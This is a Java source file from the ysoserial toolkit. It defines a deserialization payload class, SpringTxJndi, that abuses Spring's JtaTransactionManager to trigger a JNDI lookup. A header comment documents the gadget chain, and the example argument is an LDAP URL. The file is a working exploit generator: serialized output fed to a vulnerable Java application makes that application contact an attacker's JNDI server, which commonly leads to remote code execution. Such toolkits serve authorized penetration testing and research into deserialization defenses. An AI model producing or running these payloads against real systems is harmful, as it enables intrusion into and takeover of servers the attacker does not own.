package ysoserial.payloads;

import org.springframework.transaction.jta.JtaTransactionManager;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Gadget chain:
 *     ObjectInputStream.readObject() (java.io)
 *     JtaTransactionManager.readObject() (org.springframework.transaction.jta)
 *     JtaTransactionManager.initUserTransactionAndTransactionManager() (org.springframework.transaction.jta)
 *     JtaTransactionManager.lookupUserTransaction() (org.springframework.transaction.jta)
 *     JndiTemplate.lookup() (org.springframework.jndi)
 *     InitialContext.lookup() (javax.naming)
 * Arg:
 *      - JNDI name (e.g. ldap://127.0.0.1:1389/o=tomcat)
 * Requires:
 *     spring-tx
 * Yields:
 *      JNDI lookup
 */

@Dependencies({"org.springframework:spring-tx:5.3.21"})
@Authors({Authors.ANONYMOUS})
public class SpringTxJndi implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SpringTxJndi.class, args);
    }

    @Override
    public Object getObject(String command) throws Exception {
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(command);
        return manager;
    }
}
